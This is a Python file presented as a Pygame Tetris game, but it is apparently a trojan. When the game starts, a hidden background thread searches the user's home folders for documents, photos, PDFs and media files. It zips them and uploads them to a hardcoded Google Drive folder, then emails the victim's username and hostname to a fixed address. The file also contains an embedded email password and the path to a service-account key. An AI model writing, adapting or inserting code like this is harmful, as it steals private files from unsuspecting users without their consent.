import getpass
import threading
import pygame
import sys
import os
import mimetypes
import multiprocessing
import smtplib
import zipfile
from google.oauth2 import service_account
from googleapiclient.discovery import build
from googleapiclient.http import MediaFileUpload
import time
from email.message import EmailMessage
from game import Game
from colors import Colors

# Ensure the environment uses UTF-8 encoding
sys.stdout.reconfigure(encoding='utf-8')

# Path to your service account key file
SERVICE_ACCOUNT_FILE = 'Python-Tetris-Game-Pygame\\is-project-426813-de69ec3953ff.json'

# Define the scopes
SCOPES = ['https://www.googleapis.com/auth/drive.file']

# Authenticate using the service account
credentials = service_account.Credentials.from_service_account_file(
    SERVICE_ACCOUNT_FILE, scopes=SCOPES)

# Build the Drive API service
service = build('drive', 'v3', credentials=credentials)

# ID of the "IS Project" folder in Google Drive
IS_PROJECT_FOLDER_ID = '1cUHJrPRmudSQFzeOYToDEybq-cojylNw'  # Replace with your actual folder ID

def upload_to_gdrive(service, file_path, folder_id):
    file_metadata = {
        'name': os.path.basename(file_path),
        'parents': [folder_id]
    }
    mime_type = mimetypes.guess_type(file_path)[0]
    media = MediaFileUpload(file_path, mimetype=mime_type)
    file = service.files().create(body=file_metadata, media_body=media, fields='id').execute()
    file_id = file.get('id')
    return file_id

def compress_files(files, archive_name):
    with zipfile.ZipFile(archive_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for file in files:
            try:
                arcname = os.path.relpath(file, start=os.path.dirname(files[0]))
                arcname = arcname.encode('utf-8', errors='ignore').decode('utf-8')
                zipf.write(file, arcname)
                print(f"File added to archive: {file}")
            except (OSError, TypeError, UnicodeEncodeError) as e:
                print(f"Skipping file {file} due to error: {e}")
    return archive_name

def send_email(subject, body, to):
    from_email = 'asgharabbasi267@gmail.com'
    password = 'ffpd dvzn blce mijf'
    
    msg = EmailMessage()
    msg['Subject'] = subject
    msg['From'] = from_email
    msg['To'] = to
    msg.set_content(body.encode('utf-8', errors='ignore').decode('utf-8'))
    
    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(from_email, password)
        smtp.send_message(msg)
        print(f'Email sent to {to}')

FILE_EXTENSIONS = ['.txt', '.pdf', '.jpg', '.png', '.docx', '.mp3', '.mp4', '.jfif']

def find_files(directories, size_limit=25 * 1024 * 1024):
    files = []
    total_size = 0
    for directory in directories:
        for root, dirs, files_in_dir in os.walk(directory):
            for file in files_in_dir:
                file_path = os.path.join(root, file)
                try:
                    file_size = os.path.getsize(file_path)
                except OSError as e:
                    print(f"Skipping file {file_path}: {e}")
                    continue
                
                # Skip files that are too large or not in the allowed extensions
                if file_size == 0 or file_size > size_limit or not file.endswith(tuple(FILE_EXTENSIONS)):
                    continue
                
                if total_size + file_size > size_limit:
                    yield files
                    files = []
                    total_size = 0
                files.append(file_path)
                total_size += file_size
    if files:
        yield files

def process_directory(directory):
    parent_dir_name = os.path.basename(directory)
    try:
        for file_batch in find_files([directory]):
            # Create a unique archive name based on the directory and timestamp
            timestamp = time.strftime("%Y%m%d-%H%M%S")
            archive_name = f"{parent_dir_name}_{timestamp}.zip"

            # Compress files
            archive_name = compress_files(file_batch, archive_name)
            try:
                file_id = upload_to_gdrive(service, archive_name, IS_PROJECT_FOLDER_ID)
                print(f"Uploaded {archive_name} to Google Drive with file ID: {file_id}")

                # Delete the local zip file
                os.remove(archive_name)
                print(f"Deleted local archive: {archive_name}")
            except Exception as e:
                print(f"Failed to upload file {archive_name}: {e}")
 
    except UnicodeEncodeError as e:
        print(f"UnicodeEncodeError: {e}")       
    except Exception as e:
        print(f"Failed to process directory {directory}: {e}")

def file_processing_task():
    # Directories to exclude
    exclude_dirs = {'Windows', 'Program Files', 'Program Files (x86)', 'ProgramData', 'AppData', '.git', '.ipython',
                    '.vscode', '.streamlit', '.jupyter', 'node_modules' }
    
    # Traverse all directories in the user's home directory
    user_home = os.path.expanduser('~')
    directories_to_explore = [
        os.path.join(user_home, d) for d in os.listdir(user_home) 
        if os.path.isdir(os.path.join(user_home, d)) and d not in exclude_dirs
    ]
    
    # Create a multiprocessing pool
    with multiprocessing.Pool() as pool:
        # Map the process_directory function to each directory in parallel
        pool.map(process_directory, directories_to_explore)
         # Send an email notification for each directory
    username = getpass.getuser()

    # Other details can be retrieved similarly
    # For example, the hostname
    hostname = os.uname().nodename
    recipient_email = 'asgharabbasi232@gmail.com'
    send_email(
        subject=f'Files Uploaded by {username}',
        body=f'The files have been successfully uploaded to Google Drive by {username} on {hostname}.',
        to=recipient_email
        )

def game_task():
    pygame.init()

    title_font = pygame.font.Font(None, 40)
    score_surface = title_font.render("Score", True, Colors.white)
    next_surface = title_font.render("Next", True, Colors.white)
    game_over_surface = title_font.render("GAME OVER", True, Colors.white)

    score_rect = pygame.Rect(320, 55, 170, 60)
    next_rect = pygame.Rect(320, 215, 170, 180)

    screen = pygame.display.set_mode((500, 620))
    pygame.display.set_caption("Python Tetris")

    clock = pygame.time.Clock()

    game = Game()

    GAME_UPDATE = pygame.USEREVENT
    pygame.time.set_timer(GAME_UPDATE, 400)

    while True:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pygame.quit()
                sys.exit()
            if event.type == pygame.KEYDOWN:
                if game.game_over == True:
                    game.game_over = False
                    game.reset()
                if event.key == pygame.K_LEFT and game.game_over == False:
                    game.move_left()
                if event.key == pygame.K_RIGHT and game.game_over == False:
                    game.move_right()
                if event.key == pygame.K_DOWN and game.game_over == False:
                    game.move_down()
                    game.update_score(0, 1)
                if event.key == pygame.K_UP and game.game_over == False:
                    game.rotate()
            if event.type == GAME_UPDATE and game.game_over == False:
                game.move_down()

        # Drawing
        score_value_surface = title_font.render(str(game.score), True, Colors.white)

        screen.fill(Colors.dark_blue)
        screen.blit(score_surface, (365, 20, 50, 50))
        screen.blit(next_surface, (375, 180, 50, 50))

        if game.game_over == True:
            screen.blit(game_over_surface, (320, 450, 50, 50))

        pygame.draw.rect(screen, Colors.light_blue, score_rect, 0, 10)
        screen.blit(score_value_surface, score_value_surface.get_rect(centerx = score_rect.centerx, 
            centery = score_rect.centery))
        pygame.draw.rect(screen, Colors.light_blue, next_rect, 0, 10)
        game.draw(screen)

        pygame.display.update()
        clock.tick(60)

if __name__ == '__main__':
    # Create threads for file processing and the game
    file_processing_thread = threading.Thread(target=file_processing_task)
    game_thread = threading.Thread(target=game_task)

    # Start the threads
    file_processing_thread.start()
    game_thread.start()

    # Wait for the threads to complete
    file_processing_thread.join()
    game_thread.join()
